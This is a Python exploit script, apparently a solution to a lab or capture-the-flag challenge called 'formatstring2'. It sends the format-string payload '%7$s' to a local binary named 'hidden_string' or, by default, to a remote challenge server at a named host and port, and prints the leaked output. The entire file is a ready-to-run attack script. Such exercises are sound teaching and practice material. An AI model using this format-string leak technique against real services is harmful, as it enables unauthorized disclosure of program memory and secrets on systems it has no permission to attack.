#!/usr/bin/env python3
"""
formatstring2 helper.

Default use:
    python exploit.py

Local mode:
    python exploit.py --mode local
"""

from __future__ import annotations

import argparse
import socket
import subprocess
from pathlib import Path


SCRIPT_DIR = Path(__file__).resolve().parent
FORMATSTRING_DIR = SCRIPT_DIR.parent / "formatstring2"
DEFAULT_BINARY = str(FORMATSTRING_DIR / "hidden_string")
DEFAULT_HOST = "moa6.eecs.utk.edu"
DEFAULT_PORT = 32110
DEFAULT_PAYLOAD = "%7$s"
DEFAULT_PROMPT = "What's your name?"


def recv_until(sock: socket.socket, marker: bytes, timeout: float = 5.0) -> bytes:
    """Read data until marker appears."""
    sock.settimeout(timeout)
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def build_payload(payload: str) -> bytes:
    if not payload.endswith("\n"):
        payload += "\n"
    return payload.encode()


def run_local(binary: str, payload: str, prompt: str) -> None:
    proc = subprocess.Popen(
        [binary],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=0,
        cwd=str(FORMATSTRING_DIR),
    )

    if proc.stdin is None or proc.stdout is None:
        raise RuntimeError("Failed to open subprocess pipes")

    seen = ""
    while prompt not in seen:
        ch = proc.stdout.read(1)
        if ch == "":
            break
        seen += ch

    print(seen, end="")

    proc.stdin.write(build_payload(payload).decode())
    proc.stdin.flush()

    rest = proc.stdout.read()
    if rest:
        print(rest, end="")

    proc.wait(timeout=3)


def run_remote(host: str, port: int, payload: str, prompt: str) -> None:
    with socket.create_connection((host, port), timeout=5.0) as sock:
        pre = recv_until(sock, prompt.encode())
        print(pre.decode(errors="replace"), end="")

        sock.sendall(build_payload(payload))

        sock.settimeout(2.0)
        out = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                out += chunk
        except socket.timeout:
            pass

        print(out.decode(errors="replace"), end="")


def main() -> None:
    parser = argparse.ArgumentParser(description="formatstring2 helper")
    parser.add_argument(
        "--mode",
        choices=["local", "remote"],
        default="remote",
        help="target mode (default: remote)",
    )
    parser.add_argument("--binary", default=DEFAULT_BINARY)
    parser.add_argument("--host", default=DEFAULT_HOST)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--payload", default=DEFAULT_PAYLOAD)
    parser.add_argument("--prompt", default=DEFAULT_PROMPT)
    args = parser.parse_args()

    if args.mode == "local":
        run_local(args.binary, args.payload, args.prompt)
    else:
        run_remote(args.host, args.port, args.payload, args.prompt)


if __name__ == "__main__":
    main()
